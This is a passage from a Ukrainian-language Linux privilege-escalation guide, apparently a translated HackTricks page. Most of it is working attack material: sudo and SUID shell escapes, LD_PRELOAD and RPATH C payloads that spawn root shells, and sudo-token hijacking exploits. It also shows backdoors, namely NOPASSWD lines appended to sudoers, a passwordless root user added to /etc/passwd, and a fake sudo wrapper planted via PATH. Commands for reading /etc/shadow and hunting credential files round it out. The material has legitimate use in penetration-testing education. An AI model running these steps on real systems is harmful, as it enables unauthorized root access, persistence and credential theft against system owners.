lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були порушені багом, який дозволяє користувачам з **UID > INT\_MAX** підвищувати привілеї. Додаткова інформація: [тут](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [тут](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) та [тут](https://twitter.com/paragonsec/status/1071152249529884674).\
**Використовуйте це** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якої-небудь групи**, яка може надати вам привілеї root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Буфер обміну

Перевірте, чи є щось цікаве в буфері обміну (якщо це можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти як кожен користувач**, використовуючи цей пароль.

### Su Brute

Якщо вам не заважає робити багато шуму і на комп'ютері присутні бінарні файли `su` та `timeout`, ви можете спробувати виконати перебір користувачів за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також спробує виконати перебір користувачів.

## Зловживання записуємими шляхами

### $PATH

Якщо ви виявите, що ви можете **записувати всередині деякої папки $PATH**, ви можете підняти привілеї, створивши задній прохід всередині записуємої папки з ім'ям якоїсь команди, яка буде виконана іншим користувачем (ідеально root) і яка **не завантажується з папки, що розташована перед вашою записуємою папкою в $PATH**.

### SUDO та SUID

Вам може бути дозволено виконати деяку команду за допомогою sudo або вони можуть мати біт suid. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють вам читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачеві виконувати деякі команди з привілеями іншого користувача без введення пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тепер отримати оболонку стає тривіально, додавши ключ ssh у каталог `root` або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачеві **встановлювати змінну середовища** під час виконання чого-небудь:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **заснований на машині HTB Admirer**, був **уразливий** на **використання PYTHONPATH для викрадення** для завантаження довільної бібліотеки Python під час виконання скрипту як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Обхід виконання через Sudo, обходячи шляхи

**Перескочіть**, щоб прочитати інші файли або використовуйте **символічні посилання**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **зірочка** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Протиправні дії**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Команда Sudo/SUID-бінарний файл без шляху до команди

Якщо **дозвіл sudo** надано для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_, ви можете використати це, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ця техніка також може бути використана, якщо **suid** бінарний файл **виконує іншу команду без вказання шляху до неї (завжди перевіряйте з** _**strings**_ **вміст дивного SUID-бінарного файлу)**.

[Приклади полезних навантажень для виконання.](payloads-to-execute.md)

### SUID-бінарний файл зі шляхом команди

Якщо **suid** бінарний файл **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **експортувати функцію**, яка має таку ж назву, як команда, яку викликає файл suid.

Наприклад, якщо suid-бінарний файл викликає _**/usr/sbin/service apache2 start**_, вам слід спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Змінна середовища **LD\_PRELOAD** використовується для вказівки однієї або декількох спільних бібліотек (.so файли), які будуть завантажені завантажувачем перед усіма іншими, включаючи стандартну бібліотеку C (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, для забезпечення безпеки системи та запобігання зловживання цією функцією, особливо з використанням виконуваних файлів з правами suid/sgid, система накладає певні умови:

* Завантажувач ігнорує **LD\_PRELOAD** для виконуваних файлів, де реальний ідентифікатор користувача (_ruid_) не відповідає ефективному ідентифікатору користувача (_euid_).
* Для виконуваних файлів з suid/sgid завантажуються лише бібліотеки в стандартних шляхах, які також мають suid/sgid.

Підвищення привілеїв може відбутися, якщо у вас є можливість виконувати команди з `sudo`, а вивід `sudo -l` містить заяву **env\_keep+=LD\_PRELOAD**. Ця конфігурація дозволяє змінній середовища **LD\_PRELOAD** залишатися та визнаватися навіть під час виконання команд з `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Зберегти як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його**, використовуючи:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **підвищте привілеї** запускаючи
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Подібний підвищення привілеїв може бути зловжито, якщо зловмисник контролює змінну середовища **LD\_LIBRARY\_PATH**, оскільки він контролює шлях, де будуть шукатися бібліотеки.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so ін'єкція

При зустрічі бінарного файлу з дозволами **SUID**, який виглядає незвичайно, корисно перевірити, чи він належним чином завантажує файли **.so**. Це можна перевірити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, зіткнення з помилкою типу _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Для експлуатації цього, користувач міг би продовжити, створивши файл С з назвою _"/path/to/.config/libcalc.c"_, що містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, спрямований на підвищення привілеїв шляхом маніпулювання дозволами файлів та виконання оболонки з підвищеними привілеями.

Скомпілюйте вищезазначений файл C у файл об'єкта з розширенням .so за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## Зловживання спільним об'єктом
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID-бінарний файл, який завантажує бібліотеку з папки, куди ми можемо записувати, створимо бібліотеку в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку такого типу
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Це означає, що у згенерованій вами бібліотеці повинна бути функція під назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) - це підібраний список Unix-бінарників, які можуть бути використані зловмисником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) - те ж саме, але для випадків, коли ви можете **лише впроваджувати аргументи** у команду.

Проект збирає законні функції Unix-бінарників, які можуть бути зловживані для виходу з обмежених оболонок, ескалації або підтримки підвищених привілеїв, передачі файлів, створення прив'язаних та зворотних оболонок та сприяння іншим завданням після експлуатації.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Якщо у вас є доступ до `sudo -l`, ви можете використовувати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи він знаходить спосіб використання будь-якого правила sudo.

### Повторне використання токенів Sudo

У випадках, коли у вас є **доступ до sudo**, але немає пароля, ви можете підвищити привілеї, **чекаючи на виконання команди sudo, а потім захоплюючи токен сеансу**.

Вимоги для підвищення привілеїв:

* У вас вже є оболонка як користувач "_sampleuser_"
* "_sampleuser_" **використовував `sudo`** для виконання чогось **останні 15 хвилин** (за замовчуванням це тривалість токена sudo, який дозволяє нам використовувати `sudo` без введення пароля)
* `cat /proc/sys/kernel/yama/ptrace_scope` дорівнює 0
* `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете підвищити привілеї, використовуючи:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **Перша експлуатація** (`exploit.sh`) створить бінарний файл `activate_sudo_token` в _/tmp_. Ви можете використовувати його для **активації токена sudo у вашому сеансі** (ви не отримаєте автоматично оболонку root, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Друга **експлойта** (`exploit_v2.sh`) створить оболонку sh в _/tmp_ **належність root з setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Третій експлойт (`exploit_v3.sh`) створить файл sudoers, який робить токени sudo вічними та дозволяє всім користувачам використовувати sudo.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Ім'я користувача>

Якщо у вас є **права на запис** у папці або на будь-якому з створених файлів всередині папки, ви можете використовувати бінарний файл [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) для **створення токену sudo для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є оболонка як цей користувач з PID 1234, ви можете **отримати привілеї sudo** не потребуючи знання пароля, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` та як. Ці файли **за замовчуванням можуть бути прочитані лише користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви можете **отримати цікаву інформацію**, і якщо ви можете **записати** будь-який файл, ви зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете писати, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживання цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD, не забудьте перевірити його конфігурацію за шляхом `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Захоплення Sudo

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв, і ви отримали оболонку в контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який буде виконувати ваш код в якості root, а потім команду користувача. Потім **змініть $PATH** контексту користувача (наприклад, додавши новий шлях у .bash\_profile), щоб при виконанні користувачем sudo виконувався ваш виконуваний файл sudo.

Зверніть увагу, що якщо користувач використовує інший оболонку (не bash), вам доведеться змінити інші файли, щоб додати новий шлях. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ви можете знайти інший приклад у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Або виконати щось на зразок:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує **звідки завантажуються файли конфігурації**. Зазвичай, цей файл містить наступний шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані файли конфігурації з `/etc/ld.so.conf.d/*.conf`. Ці файли конфігурації **вказують на інші теки**, де будуть **шукатися бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` - `/usr/local/lib`. **Це означає, що система буде шукати бібліотеки всередині `/usr/local/lib`**.

Якщо **користувач має права на запис** до будь-якого з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якого файлу всередині `/etc/ld.so.conf.d/` або будь-якої теки всередині файлу конфігурації всередині `/etc/ld.so.conf.d/*.conf`, він може мати можливість підвищення привілеїв.\
Перегляньте **як експлуатувати цю помилку конфігурації** на наступній сторінці:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіюючи бібліотеку в `/var/tmp/flag15/`, вона буде використовуватися програмою в цьому місці, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Тоді створіть зловісну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Вміння

Можливості Linux надають **підмножину доступних привілеїв root процесу**. Це ефективно розбиває привілеї root на менші та відмінні одиниці. Кожну з цих одиниць можна надавати процесам незалежно. Таким чином повний набір привілеїв зменшується, зменшуючи ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про можливості та як їх зловживати**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Дозволи каталогу

У каталозі **біт для "виконання"** означає, що користувач, який стосується, може "**cd**" у папку.\
Біт **"читання"** означає, що користувач може **переглядати** **файли**, а біт **"запису"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Списки керування доступом (ACL) представляють собою вторинний рівень умовних дозволів, здатних **перевищувати традиційні дозволи ugo/rwx**. Ці дозволи покращують контроль над доступом до файлу або каталогу, дозволяючи або відмовляючи права конкретним користувачам, які не є власниками або частиною групи. Цей рівень **деталізації забезпечує більш точне управління доступом**. Додаткові відомості можна знайти [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надайте** користувачеві "kali" права на читання та запис у файлі:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з конкретними ACL на системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриття оболонок

У **старих версіях** ви можете **захопити** деякі **сеанси оболонки** іншого користувача (**root**).\
У **новіших версіях** ви зможете **підключитися** лише до сеансів екрану **власного користувача**. Однак ви можете знайти **цікаву інформацію всередині сеансу**.

### Захоплення сеансів екрану

**Перелік сеансів екрану**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Прикріплення до сеансу**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Захоплення сеансів tmux

Це була проблема з **старими версіями tmux**. Я не міг захопити сеанс tmux (v2.1), створений користувачем root як не привілейований користувач.

**Перелік сеансів tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Прикріплення до сеансу**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box від HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі ключі SSL та SSH, створені на системах на основі Debian (Ubuntu, Kubuntu і т. д.) між вереснем 2006 року та 13 травня 2008 року можуть бути пошкоджені цим багом.\
Цей баг виникає при створенні нового ssh ключа в цих ОС, оскільки **можливі лише 32 768 варіантів**. Це означає, що всі можливості можна розрахувати, і **маючи публічний ключ ssh, ви можете шукати відповідний приватний ключ**. Ви можете знайти розраховані можливості тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Цікаві значення конфігурації SSH

* **PasswordAuthentication:** Вказує, чи дозволена аутентифікація за паролем. За замовчуванням - `no`.
* **PubkeyAuthentication:** Вказує, чи дозволена аутентифікація за публічним ключем. За замовчуванням - `yes`.
* **PermitEmptyPasswords**: Коли дозволена аутентифікація за паролем, вказує, чи дозволяє сервер вхід в облікові записи з порожніми рядками паролю. За замовчуванням - `no`.

### PermitRootLogin

Вказує, чи може root увійти за допомогою ssh, за замовчуванням - `no`. Можливі значення:

* `yes`: root може увійти за допомогою пароля та приватного ключа
* `without-password` або `prohibit-password`: root може увійти лише за допомогою приватного ключа
* `forced-commands-only`: Root може увійти лише за допомогою приватного ключа, якщо вказані параметри команд
* `no` : no

### AuthorizedKeysFile

Вказує файли, які містять публічні ключі, які можна використовувати для аутентифікації користувача. Він може містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказати абсолютні шляхи** (починаючи з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Така конфігурація покаже, що якщо ви спробуєте увійти за допомогою **приватного** ключа користувача "**testusername**", ssh порівняє публічний ключ вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Пересилання SSH агента дозволяє вам **використовувати ваші локальні SSH ключі замість того, щоб залишати ключі** (без паролів!) на вашому сервері. Таким чином, ви зможете **перейти** через ssh **на хост** і звідти **перейти на інший** хост, **використовуючи** ключ, що знаходиться на вашому **початковому хості**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` таким чином:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` - це `*`, кожного разу, коли користувач переходить на іншу машину, ця машина зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначити** ці **опції** та дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволити** або **заборонити** пересилання ssh-агента за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням - дозволено).

Якщо ви виявите, що Forward Agent налаштований в середовищі, прочитайте наступну сторінку, оскільки **ви можете використати це для підвищення привілеїв**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Цікаві файли

### Файли профілю

Файл `/etc/profile` та файли у `/etc/profile.d/` - це **сценарії, які виконуються, коли користувач запускає новий оболонку**. Тому, якщо ви можете **записати або змінити будь-який з них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо виявлено будь-який дивний сценарій профілю, ви повинні перевірити його на **чутливі дані**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або там може бути резервна копія. Тому рекомендується **знайти всі** їх та **перевірити, чи можете ви читати** їх, щоб побачити, **чи є в них хеші**.
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках ви можете знайти **хеші паролів** всередині файлу `/etc/passwd` (або еквівалентного)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Записуваний /etc/passwd

Спочатку створіть пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і встановіть згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наступні рядки, щоб додати користувача-пустун без пароля.\
ПОПЕРЕДЖЕННЯ: ви можете погіршити поточний рівень безпеки машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**ПРИМІТКА:** На платформах BSD файл `/etc/passwd` розташовується за адресою `/etc/pwd.db` і `/etc/master.passwd`, також файл `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записувати в **файл конфігурації служби**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо машина працює на сервері **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/**, то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### Перевірка тек

Наступні теки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне місце/Власні файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли баз даних Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_історія, .sudo\_як\_адмін\_успішно, профіль, bashrc, httpd.conf, .план, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/Виконувані файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використовувати для цього, це: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), який є відкритим додатком, призначеним для отримання багатьох паролів, збережених на локальному комп'ютері для Windows, Linux та Mac.

### Журнали

Якщо ви можете читати журнали, ви, можливо, зможете знайти **цікаву/конфіденційну інформацію всередині них**. Чим дивніше буде журнал, тим цікавіше він буде (імовірно).\
Також, деякі "**погано**" налаштовані (з задніми дверима?) **журнали аудиту** можуть дозволити вам **записувати паролі** всередині журналів аудиту, як пояснено в цьому пості: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Для того щоб **читати журнали групи** [**adm**](цікаві-групи-linux-pe/#група-adm) буде дійсно корисно.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Загальний пошук/Regex облікових даних

